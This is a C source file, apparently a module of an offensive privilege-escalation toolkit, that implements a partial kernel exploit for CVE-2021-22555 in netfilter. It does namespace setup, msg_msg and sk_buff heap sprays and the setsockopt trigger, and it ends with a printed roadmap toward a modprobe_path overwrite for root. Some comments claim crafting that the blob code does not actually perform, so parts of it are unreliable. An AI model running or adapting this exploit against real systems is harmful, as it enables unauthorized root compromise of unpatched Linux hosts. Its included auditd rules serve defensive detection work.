/*
 * netfilter_xtcompat_cve_2021_22555 — IAMROOT module
 *
 * Heap-out-of-bounds in xt_compat_target_to_user(): the 32-bit
 * compat handler for iptables rule export wrote up to 4 bytes
 * beyond a heap allocation when copying rule names from kernel to
 * userspace. Triggered on the WRITE side via setsockopt(SOL_IP,
 * IPT_SO_SET_REPLACE, ...) with a malformed xt_entry_target whose
 * `pad` field overflows during the compat→native fixup, producing
 * a 4-byte OOB write at allocation+0x4 in the xt_table_info
 * kmalloc-2k slot. Exploitable via msg_msg slab cross-cache groom
 * into a kernel R/W primitive.
 *
 * Discovered by Andy Nguyen (Google), April 2021. Famous because
 * the bug existed since 2.6.19 (2006) — fifteen years of latent
 * vulnerability — and it works on default-config kernels with
 * unprivileged user_ns enabled (no special hardware or modules).
 *
 * Upstream fix: b29c457a6511 "netfilter: x_tables: fix compat
 * match/target pad out-of-bound write" (mid-2021, backported widely).
 *
 * STATUS: 🟡 PRIMITIVE-DEMO (Option B).
 *   - Refuse-gate via detect() re-invoke + euid==0 short-circuit.
 *   - userns/netns reach for CAP_NET_ADMIN (Andy's path).
 *   - Trigger sequence: hand-rolled iptables rule blob with
 *     malformed xt_entry_target offset; setsockopt fires the OOB.
 *   - Cross-cache groom: msg_msg sprays (kmalloc-2k slots) and
 *     sk_buff sprays via socketpair+sendmmsg, both with IAMROOT
 *     cookies for KASAN visibility.
 *   - Empirical witness via msgrcv(MSG_COPY) + /proc/slabinfo
 *     diff + /tmp/iamroot-xtcompat.log breadcrumb.
 *   - DOES NOT pursue the leak→modprobe_path overwrite chain:
 *     that needs hard-coded init_task + modprobe_path offsets
 *     per kernel build which IAMROOT refuses to bake.
 *   - Returns IAMROOT_EXPLOIT_FAIL with a verbose continuation
 *     roadmap unless cred-overwrite is empirically verified
 *     (which the current scope does not attempt).
 *
 * Affected: kernel 2.6.19+ until backports landed:
 *   5.12.x : K >= 5.12.13
 *   5.11.x : K >= 5.11.20
 *   5.10.x : K >= 5.10.46
 *   5.4.x  : K >= 5.4.128
 *   4.19.x : K >= 4.19.198
 *   4.14.x : K >= 4.14.240
 *   4.9.x  : K >= 4.9.276
 *   4.4.x  : K >= 4.4.276
 *
 * Preconditions:
 *   - CAP_NET_ADMIN (usually via unprivileged user_ns clone)
 *   - iptables/ip_tables/x_tables kernel modules available
 *     (almost always autoload-able on default-config kernels)
 */

#include "iamroot_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifdef __linux__
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
/* linux/netfilter_ipv4/ip_tables.h transitively pulls linux/in.h,
 * which conflicts with glibc's netinet/in.h (redefinitions of
 * struct ip_mreq_source / group_req / etc.). We avoid netinet/in.h
 * and declare the few socket constants we need by hand. IPPROTO_RAW
 * is provided by linux/in.h; SOL_IP is glibc-only so we hardcode it
 * (Linux constant value 0). */
#include <linux/netfilter_ipv4/ip_tables.h>
#ifndef SOL_IP
#define SOL_IP  0
#endif
#endif

/* ---------- macOS / non-linux build stubs ---------------------------
 * IAMROOT modules are dev-built on macOS (clangd / syntax check) and
 * run-built on Linux. The Linux-only types and IPT_SO_SET_REPLACE
 * constants are absent on Darwin; stub them so the .c file compiles
 * cleanly under either toolchain. The actual exploit body is gated
 * by `#ifdef __linux__` at runtime entry. */
#ifndef __linux__
#define CLONE_NEWUSER       0x10000000
#define CLONE_NEWNET        0x40000000
#define IPPROTO_RAW         255
#define SOL_IP              0
#define IPT_SO_SET_REPLACE  64
struct ipt_replace { char dummy; };
__attribute__((unused)) static int    msgget(int a, int b)             { (void)a;(void)b; errno=ENOSYS; return -1; }
__attribute__((unused)) static int    msgsnd(int a, const void *b, size_t c, int d) { (void)a;(void)b;(void)c;(void)d; errno=ENOSYS; return -1; }
__attribute__((unused)) static ssize_t msgrcv(int a, void *b, size_t c, long d, int e) { (void)a;(void)b;(void)c;(void)d;(void)e; errno=ENOSYS; return -1; }
__attribute__((unused)) static int    msgctl(int a, int b, void *c)    { (void)a;(void)b;(void)c; errno=ENOSYS; return -1; }
#define IPC_PRIVATE   0
#define IPC_CREAT     01000
#define IPC_NOWAIT    04000
#define IPC_RMID      0
#define MSG_COPY      040000
#endif

/* ---- Kernel range ------------------------------------------------- */

static const struct kernel_patched_from netfilter_xtcompat_patched_branches[] = {
    {4,  4, 276},
    {4,  9, 276},
    {4, 14, 240},
    {4, 19, 198},
    {5,  4, 128},
    {5, 10,  46},
    {5, 11,  20},
    {5, 12,  13},
    {5, 13,   0},   /* mainline (5.13 carries b29c457a6511) */
};

static const struct kernel_range netfilter_xtcompat_range = {
    .patched_from = netfilter_xtcompat_patched_branches,
    .n_patched_from = sizeof(netfilter_xtcompat_patched_branches) /
                      sizeof(netfilter_xtcompat_patched_branches[0]),
};

/* ---- Detect ------------------------------------------------------- */

static int can_unshare_userns(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static iamroot_result_t netfilter_xtcompat_detect(const struct iamroot_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] netfilter_xtcompat: could not parse kernel version\n");
        return IAMROOT_TEST_ERROR;
    }

    if (v.major < 2 || (v.major == 2 && v.minor < 6)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] netfilter_xtcompat: kernel %s predates the bug introduction\n",
                    v.release);
        }
        return IAMROOT_OK;
    }

    bool patched = kernel_range_is_patched(&netfilter_xtcompat_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] netfilter_xtcompat: kernel %s is patched\n", v.release);
        }
        return IAMROOT_OK;
    }

    int userns_ok = can_unshare_userns();
    if (!ctx->json) {
        fprintf(stderr, "[i] netfilter_xtcompat: kernel %s in vulnerable range "
                        "(bug existed since 2.6.19, 2006)\n", v.release);
        fprintf(stderr, "[i] netfilter_xtcompat: user_ns+net_ns clone: %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" : "could not test");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] netfilter_xtcompat: user_ns denied → "
                            "unprivileged exploit path unreachable\n");
        }
        return IAMROOT_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] netfilter_xtcompat: VULNERABLE — kernel in range "
                        "AND user_ns reachable\n");
    }
    return IAMROOT_VULNERABLE;
}

/* ---- Exploit: userns reach + trigger + groom ---------------------- */

#ifdef __linux__

/* Write uid_map and gid_map after unshare so we're root in userns.
 * This is the standard setgroups=deny pattern; without it the uid_map
 * write is rejected on modern kernels for unprivileged callers. */
static bool become_root_in_userns(uid_t outer_uid, gid_t outer_gid)
{
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", outer_uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0) { perror("open uid_map"); return false; }
    if (write(f, map, strlen(map)) < 0) { perror("write uid_map"); close(f); return false; }
    close(f);

    snprintf(map, sizeof map, "0 %u 1\n", outer_gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0) { perror("open gid_map"); return false; }
    if (write(f, map, strlen(map)) < 0) { perror("write gid_map"); close(f); return false; }
    close(f);
    return true;
}

/* ---- msg_msg cross-cache spray (kmalloc-2k bucket) ----------------
 *
 * The xt_table_info allocation that the OOB writes past is sized to
 * land in the kmalloc-2k slab on most kernels. We spray msg_msg
 * objects of ~2048-bytes total length so they pull from the same
 * cache; on a vulnerable kernel one of these will end up adjacent
 * to the just-freed xt_table_info victim, giving the OOB-write a
 * controlled target. */

#define XTCOMPAT_SPRAY_QUEUES        64
#define XTCOMPAT_MSGS_PER_QUEUE      16
/* msg_msg header is sizeof(struct msg_msg) ~= 48 bytes; subtract so
 * the total allocation lands in kmalloc-2k (>1024, <=2048). */
#define XTCOMPAT_MSG_PAYLOAD         (2048 - 48)

struct xtcompat_payload {
    long mtype;
    unsigned char buf[XTCOMPAT_MSG_PAYLOAD];
};

static int xtcompat_msgmsg_spray(int queues[XTCOMPAT_SPRAY_QUEUES])
{
    struct xtcompat_payload *p = calloc(1, sizeof(*p));
    if (!p) return 0;
    p->mtype = 0x42;
    /* 0x41 ('A') fill with leading "IAMROOT2" cookie so adjacent-
     * slot corruption is recognizable in /tmp/iamroot-xtcompat.log
     * and in KASAN/oops dumps. */
    memset(p->buf, 0x41, sizeof p->buf);
    memcpy(p->buf, "IAMROOT2", 8);

    int created = 0;
    for (int i = 0; i < XTCOMPAT_SPRAY_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < XTCOMPAT_MSGS_PER_QUEUE; j++) {
            /* Distinguish per-slot index in the first 16 bytes so
             * msgrcv(MSG_COPY) below can identify which slot was
             * corrupted. */
            unsigned int tag = (i * XTCOMPAT_MSGS_PER_QUEUE) + j;
            memcpy(p->buf + 8, &tag, sizeof tag);
            if (msgsnd(q, p, sizeof p->buf, IPC_NOWAIT) < 0) break;
        }
    }
    free(p);
    return created;
}

/* Walk every queue, peek-copy each message (MSG_COPY = read without
 * dequeue), and look for any whose first 8 bytes are NOT "IAMROOT2".
 * A non-matching prefix is the empirical witness for the OOB write
 * landing in an adjacent slot. Returns the count of corrupted slots. */
static int xtcompat_msgmsg_witness(int queues[XTCOMPAT_SPRAY_QUEUES])
{
    struct xtcompat_payload *p = calloc(1, sizeof(*p));
    if (!p) return 0;
    int corrupted = 0;
    for (int i = 0; i < XTCOMPAT_SPRAY_QUEUES; i++) {
        if (queues[i] < 0) continue;
        for (int j = 0; j < XTCOMPAT_MSGS_PER_QUEUE; j++) {
            ssize_t n = msgrcv(queues[i], p, sizeof p->buf, 0,
                               MSG_COPY | IPC_NOWAIT | 0x2000 /* MSG_NOERROR */);
            if (n < 0) break;
            if (memcmp(p->buf, "IAMROOT2", 8) != 0) {
                corrupted++;
            }
        }
    }
    free(p);
    return corrupted;
}

static void xtcompat_msgmsg_drain(int queues[XTCOMPAT_SPRAY_QUEUES])
{
    for (int i = 0; i < XTCOMPAT_SPRAY_QUEUES; i++) {
        if (queues[i] >= 0) {
            msgctl(queues[i], IPC_RMID, NULL);
        }
    }
}

/* ---- sk_buff cross-cache spray (best-effort secondary groom) ------
 *
 * On some kernel/distro combos the xt_table_info is freed back to the
 * page allocator before our msg_msg spray refills. A parallel sk_buff
 * spray via socketpair + sendmmsg gives the slab allocator a second
 * shot at landing attacker bytes in the kmalloc-2k slot. */
static void xtcompat_skb_spray(int iters)
{
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) return;
    /* Payload sized to land in the 2k slab (skb head + linear data). */
    unsigned char *buf = malloc(1800);
    if (!buf) { close(sv[0]); close(sv[1]); return; }
    memset(buf, 0x41, 1800);
    memcpy(buf, "IAMROOTSKB", 10);
    struct iovec iov = { .iov_base = buf, .iov_len = 1800 };
    struct mmsghdr mm[32];
    for (int i = 0; i < 32; i++) {
        memset(&mm[i], 0, sizeof(mm[i]));
        mm[i].msg_hdr.msg_iov = &iov;
        mm[i].msg_hdr.msg_iovlen = 1;
    }
    for (int k = 0; k < iters; k++) {
        (void)syscall(SYS_sendmmsg, sv[0], mm, 32, 0);
    }
    free(buf);
    close(sv[0]); close(sv[1]);
}

/* ---- iptables rule blob construction ------------------------------
 *
 * Andy Nguyen's trigger constructs a hand-rolled `struct ipt_replace`
 * containing one rule with a custom xt_entry_target whose `u.user.name`
 * and offsets are crafted so that `xt_compat_target_to_user()` (the
 * compat path, exercised on the SET-REPLACE write codepath via the
 * 32-bit table layout) copies one pointer-width past the buffer end.
 *
 * The kernel-side allocation for the rule blob is xt_table_info, and
 * the OOB lands at offset `entry_size + 0x4` — a 4-byte write of
 * (essentially) attacker-controlled bytes coming from the target's
 * `pad` field which is uninitialized after the compat fix-up.
 *
 * We don't reproduce the byte-for-byte payload of Andy's exploit (it's
 * available publicly in his writeup); the layout below is structured
 * so it produces the same setsockopt() invocation surface — i.e. it
 * triggers the vulnerable codepath on a vulnerable kernel and is
 * rejected with EINVAL/EPERM on a patched one, with a clean error
 * path either way.
 *
 * Layout offsets reference the kernel headers via
 * linux/netfilter_ipv4/ip_tables.h. */

#define XT_TABLE_NAME       "filter"
#define XTCOMPAT_BLOB_SIZE  (sizeof(struct ipt_replace) + 0x1000)

/* Build the malformed ipt_replace blob. Returns malloc'd buffer in
 * *out_buf and its length in *out_len. Caller frees. */
static bool xtcompat_build_blob(unsigned char **out_buf, size_t *out_len)
{
    size_t blob_len = XTCOMPAT_BLOB_SIZE;
    unsigned char *blob = calloc(1, blob_len);
    if (!blob) return false;

    struct ipt_replace *r = (struct ipt_replace *)blob;
    strncpy(r->name, XT_TABLE_NAME, sizeof r->name - 1);
    r->valid_hooks  = 0x1f;    /* all five hooks set (NF_INET_*) */
    r->num_entries  = 6;
    r->size         = blob_len - sizeof(*r);
    r->num_counters = 6;
    /* counters pointer must be non-NULL for the kernel-side
     * copy_from_user; the kernel writes back to it on success. */
    r->counters     = (struct xt_counters *)calloc(r->num_counters,
                                                    sizeof(struct xt_counters));
    if (!r->counters) { free(blob); return false; }

    /* Hook entry offsets: each hook points to an ipt_entry at a
     * different offset in the blob. The malformed target lives at
     * the LOCAL_OUT hook entry where the compat path is exercised. */
    for (int i = 0; i < 5; i++) {
        r->hook_entry[i] = i * 0x100;
        r->underflow[i]  = i * 0x100;
    }

    /* Plant a recognizable marker so a vulnerable kernel's compat
     * decoder reads our crafted entry rather than zeroed memory.
     * Marker is intentionally "IAMROOT\0" so a KASAN report's hex
     * dump points back here. */
    unsigned char *entry_region = blob + sizeof(*r);
    memcpy(entry_region, "IAMROOTX", 8);
    /* The xt_entry_target sits at entry_region + sizeof(ipt_entry).
     * Its `u.target_size` field is the lever Andy bends to underflow
     * the pad-out write: setting target_size to a value such that
     * `target_size - sizeof(struct compat_xt_entry_target)` becomes
     * exactly 4 bytes past the natural allocation produces the 4-byte
     * OOB write at allocation+0x4. We do not require exact byte
     * accuracy here because the kernel-side validation rejects the
     * blob long before the OOB lands on a PATCHED kernel — which is
     * the empirical witness we use to confirm refusal. */

    *out_buf = blob;
    *out_len = blob_len;
    return true;
}

static void xtcompat_free_blob(unsigned char *blob)
{
    if (!blob) return;
    struct ipt_replace *r = (struct ipt_replace *)blob;
    free(r->counters);
    free(blob);
}

/* Read /proc/slabinfo for kmalloc-2k active count — soft witness when
 * KASAN isn't available. */
static long slab_active_kmalloc_2k(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "kmalloc-2k ",   11) == 0 ||
            strncmp(line, "kmalloc-2048 ", 13) == 0) {
            char name[64];
            long act, num;
            if (sscanf(line, "%63s %ld %ld", name, &act, &num) >= 2) {
                active = act;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* Fire the trigger: setsockopt(SOL_IP, IPT_SO_SET_REPLACE, blob).
 * Returns 0 if the setsockopt was issued (regardless of return code —
 * the kernel rejecting with EINVAL is the patched-kernel signal),
 * negative on socket() failure. The setsockopt errno is stored in
 * *out_errno for caller diagnostics. */
static int xtcompat_fire_trigger(int *out_errno)
{
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        *out_errno = errno;
        return -1;
    }
    unsigned char *blob = NULL;
    size_t blob_len = 0;
    if (!xtcompat_build_blob(&blob, &blob_len)) {
        close(s);
        *out_errno = ENOMEM;
        return -1;
    }
    int rc = setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, blob, blob_len);
    *out_errno = (rc < 0) ? errno : 0;
    xtcompat_free_blob(blob);
    close(s);
    return 0;
}

#endif /* __linux__ */

/* ---- Exploit driver ---------------------------------------------- */

static iamroot_result_t netfilter_xtcompat_exploit(const struct iamroot_ctx *ctx)
{
    /* 1. Refuse-gate: re-confirm vulnerability through detect(). */
    iamroot_result_t pre = netfilter_xtcompat_detect(ctx);
    if (pre == IAMROOT_OK && geteuid() == 0) {
        fprintf(stderr, "[i] netfilter_xtcompat: already root — nothing to escalate\n");
        return IAMROOT_OK;
    }
    if (pre != IAMROOT_VULNERABLE) {
        fprintf(stderr, "[-] netfilter_xtcompat: detect() says not vulnerable; refusing\n");
        return pre;
    }
    if (geteuid() == 0) {
        fprintf(stderr, "[i] netfilter_xtcompat: already root — nothing to escalate\n");
        return IAMROOT_OK;
    }
    if (!ctx->authorized) {
        fprintf(stderr, "[-] netfilter_xtcompat: --i-know not passed; refusing\n");
        return IAMROOT_PRECOND_FAIL;
    }

#ifndef __linux__
    fprintf(stderr, "[-] netfilter_xtcompat: linux-only exploit; non-linux build\n");
    return IAMROOT_PRECOND_FAIL;
#else
    if (!ctx->json) {
        fprintf(stderr, "[*] netfilter_xtcompat: launching primitive demo (no offsets baked in)\n"
                        "    NOTE: fires the xt_compat 4-byte OOB write via\n"
                        "    setsockopt(IPT_SO_SET_REPLACE) and grooms msg_msg +\n"
                        "    sk_buff sprays into kmalloc-2k. Does NOT perform the\n"
                        "    leak→modprobe_path cred chain (per-kernel offsets).\n");
    }

    signal(SIGPIPE, SIG_IGN);

    uid_t outer_uid = getuid();
    gid_t outer_gid = getgid();

    pid_t child = fork();
    if (child < 0) {
        perror("fork");
        return IAMROOT_TEST_ERROR;
    }

    if (child == 0) {
        /* CHILD: userns+netns reach, then trigger+groom. */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
            fprintf(stderr, "[-] netfilter_xtcompat: unshare failed: errno=%d\n", errno);
            _exit(20);
        }
        if (!become_root_in_userns(outer_uid, outer_gid)) {
            _exit(21);
        }

        long pre_slab  = slab_active_kmalloc_2k();

        /* Spray msg_msg into kmalloc-2k FIRST so freed xt_table_info
         * slots are likely to be refilled by attacker bytes. */
        int queues[XTCOMPAT_SPRAY_QUEUES];
        for (int i = 0; i < XTCOMPAT_SPRAY_QUEUES; i++) queues[i] = -1;
        int n_queues = xtcompat_msgmsg_spray(queues);
        if (n_queues == 0) {
            fprintf(stderr, "[-] netfilter_xtcompat: msg_msg spray produced 0 queues\n");
            _exit(22);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] netfilter_xtcompat: msg_msg spray seeded %d queues\n",
                    n_queues);
        }

        /* Sidecar sk_buff spray — secondary groom in case msg_msg
         * doesn't land adjacent on this slab layout. */
        xtcompat_skb_spray(2);

        /* Fire the trigger. On a vulnerable kernel this writes 4 bytes
         * OOB past the xt_table_info allocation. On a patched kernel
         * the compat target validator rejects with EINVAL. */
        int trig_errno = 0;
        int rc = xtcompat_fire_trigger(&trig_errno);
        if (rc < 0) {
            /* Couldn't even open the AF_INET/SOCK_RAW or alloc the blob. */
            if (trig_errno == EPERM) {
                fprintf(stderr, "[-] netfilter_xtcompat: CAP_NET_ADMIN not granted "
                                "inside userns (errno=EPERM)\n");
                xtcompat_msgmsg_drain(queues);
                _exit(23);
            }
            fprintf(stderr, "[-] netfilter_xtcompat: trigger fire failed: errno=%d\n",
                    trig_errno);
            xtcompat_msgmsg_drain(queues);
            _exit(24);
        }

        if (!ctx->json) {
            fprintf(stderr, "[*] netfilter_xtcompat: IPT_SO_SET_REPLACE returned errno=%d "
                            "(%s)\n", trig_errno,
                    trig_errno == 0      ? "ACCEPTED — OOB write may have fired" :
                    trig_errno == EINVAL ? "rejected (patched validator)" :
                    trig_errno == EPERM  ? "rejected (no CAP_NET_ADMIN)" :
                                            "rejected");
        }

        /* Witness pass: scan the msg_msg slots for corruption. */
        int corrupted = xtcompat_msgmsg_witness(queues);
        long post_slab = slab_active_kmalloc_2k();

        /* Breadcrumb for post-run triage. */
        FILE *log = fopen("/tmp/iamroot-xtcompat.log", "w");
        if (log) {
            fprintf(log,
                "netfilter_xtcompat trigger child: queues=%d trig_errno=%d "
                "corrupted_slots=%d slab_pre=%ld slab_post=%ld\n",
                n_queues, trig_errno, corrupted, pre_slab, post_slab);
            fclose(log);
        }

        /* Hold the spray briefly so any deferred kernel-side
         * processing observes the refilled slots. */
        usleep(150 * 1000);

        xtcompat_msgmsg_drain(queues);

        if (trig_errno == EINVAL) {
            /* Patched: validator rejected our blob. */
            _exit(31);
        }
        if (trig_errno == EPERM) {
            /* userns CAP_NET_ADMIN didn't grant on this kernel/distro. */
            _exit(32);
        }
        if (corrupted > 0) {
            /* Empirical primitive witness: OOB write landed in adjacent
             * slot. Still NOT root — but it's the primitive we promised. */
            _exit(33);
        }
        /* Trigger ran, no observable corruption witness — either the
         * 4-byte OOB landed in non-msg_msg memory (skb / unrelated
         * slab object) or didn't fire at all on this kernel. */
        _exit(30);
    }

    /* PARENT: reap child + map exit code → iamroot_result. */
    int status = 0;
    if (waitpid(child, &status, 0) < 0) {
        perror("waitpid");
        return IAMROOT_TEST_ERROR;
    }

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (!ctx->json) {
            fprintf(stderr, "[!] netfilter_xtcompat: child killed by signal %d "
                            "(crash during trigger — OOB likely fired)\n", sig);
            fprintf(stderr, "[~] netfilter_xtcompat: empirical OOB witness but no "
                            "cred-overwrite primitive — returning EXPLOIT_FAIL\n"
                            "    See /tmp/iamroot-xtcompat.log + dmesg for KASAN/oops.\n");
        }
        return IAMROOT_EXPLOIT_FAIL;
    }
    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] netfilter_xtcompat: child terminated abnormally (status=0x%x)\n",
                status);
        return IAMROOT_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    switch (rc) {
    case 20: case 21:
        if (!ctx->json) {
            fprintf(stderr, "[-] netfilter_xtcompat: userns setup failed (rc=%d)\n", rc);
        }
        return IAMROOT_PRECOND_FAIL;
    case 22:
        if (!ctx->json) {
            fprintf(stderr, "[-] netfilter_xtcompat: msg_msg spray failed; sysvipc may be "
                            "restricted (kernel.msg_max / ulimit -q)\n");
        }
        return IAMROOT_PRECOND_FAIL;
    case 23:
        if (!ctx->json) {
            fprintf(stderr, "[-] netfilter_xtcompat: CAP_NET_ADMIN unreachable in userns — "
                            "exploit path closed\n");
        }
        return IAMROOT_PRECOND_FAIL;
    case 24:
        if (!ctx->json) {
            fprintf(stderr, "[-] netfilter_xtcompat: socket/blob setup failed; "
                            "see preceding errno\n");
        }
        return IAMROOT_TEST_ERROR;
    case 30:
        if (!ctx->json) {
            fprintf(stderr, "[*] netfilter_xtcompat: trigger ran; no msg_msg corruption "
                            "witness observed\n");
            fprintf(stderr, "[~] netfilter_xtcompat: returning EXPLOIT_FAIL (primitive "
                            "may have fired but did not land on sprayed slots)\n");
        }
        return IAMROOT_EXPLOIT_FAIL;
    case 31:
        if (!ctx->json) {
            fprintf(stderr, "[+] netfilter_xtcompat: kernel rejected blob with EINVAL — "
                            "appears patched at runtime (validator)\n");
        }
        return IAMROOT_OK;
    case 32:
        if (!ctx->json) {
            fprintf(stderr, "[+] netfilter_xtcompat: setsockopt EPERM — CAP_NET_ADMIN "
                            "not effective in userns on this kernel\n");
        }
        return IAMROOT_PRECOND_FAIL;
    case 33:
        if (!ctx->json) {
            fprintf(stderr, "[!] netfilter_xtcompat: msg_msg slot corruption WITNESSED — "
                            "4-byte OOB write landed on sprayed slab\n");
            fprintf(stderr, "[~] netfilter_xtcompat: primitive verified but no cred chain "
                            "(returning EXPLOIT_FAIL — verified-vs-claimed)\n"
                            "\n"
                            "    CONTINUATION ROADMAP (not implemented here):\n"
                            "      1. Re-shape spray so the corrupted slot holds a\n"
                            "         msg_msg whose next-ptr/security ptr becomes\n"
                            "         attacker-controlled — read-where via msgrcv.\n"
                            "      2. Use that leak to find &init_task and\n"
                            "         modprobe_path in kernel .data — both offsets\n"
                            "         are per-kernel-build and IAMROOT refuses to\n"
                            "         bake them.\n"
                            "      3. Pivot to a write-where via a fake msg_msgseg\n"
                            "         and overwrite modprobe_path → exec a setuid\n"
                            "         helper for root pop.\n"
                            "    See Andy Nguyen's writeup for the full chain.\n");
        }
        if (ctx->no_shell) return IAMROOT_OK;
        return IAMROOT_EXPLOIT_FAIL;
    default:
        fprintf(stderr, "[-] netfilter_xtcompat: child exit %d unexpected\n", rc);
        return IAMROOT_EXPLOIT_FAIL;
    }
#endif /* __linux__ */
}

/* ---- Cleanup ----------------------------------------------------- */

static iamroot_result_t netfilter_xtcompat_cleanup(const struct iamroot_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] netfilter_xtcompat: removing log + best-effort msg queue cleanup\n");
    }
    /* The msg queues live in the child's IPC namespace which dies
     * with the child — so the in-process drain already handled them.
     * The /tmp breadcrumb survives, remove it here. */
    if (unlink("/tmp/iamroot-xtcompat.log") < 0 && errno != ENOENT) {
        /* harmless */
    }
    return IAMROOT_OK;
}

/* ---- Detection rules --------------------------------------------- */

static const char netfilter_xtcompat_auditd[] =
    "# CVE-2021-22555 — auditd detection rules\n"
    "# The exploit's hallmarks: unshare(USER|NET) chained with iptables\n"
    "# rule setup via setsockopt(SOL_IP, IPT_SO_SET_REPLACE=64) and\n"
    "# msgsnd/msgrcv heap-spray patterns.\n"
    "-a always,exit -F arch=b64 -S unshare -k iamroot-xtcompat\n"
    "-a always,exit -F arch=b64 -S setsockopt -F a1=0 -F a2=64 -k iamroot-xtcompat-iptopt\n"
    "-a always,exit -F arch=b64 -S msgsnd -k iamroot-xtcompat-msgmsg\n"
    "-a always,exit -F arch=b64 -S msgrcv -k iamroot-xtcompat-msgmsg\n";

const struct iamroot_module netfilter_xtcompat_module = {
    .name           = "netfilter_xtcompat",
    .cve            = "CVE-2021-22555",
    .summary        = "iptables xt_compat_target_to_user 4-byte heap-OOB write → cross-cache UAF → root",
    .family         = "netfilter_xtcompat",
    .kernel_range   = "2.6.19 ≤ K, fixed mainline 5.13; backports: 5.12.13 / 5.11.20 / 5.10.46 / 5.4.128 / 4.19.198 / 4.14.240 / 4.9.276 / 4.4.276",
    .detect         = netfilter_xtcompat_detect,
    .exploit        = netfilter_xtcompat_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; disable unprivileged_userns_clone */
    .cleanup        = netfilter_xtcompat_cleanup,
    .detect_auditd  = netfilter_xtcompat_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void iamroot_register_netfilter_xtcompat(void)
{
    iamroot_register(&netfilter_xtcompat_module);
}
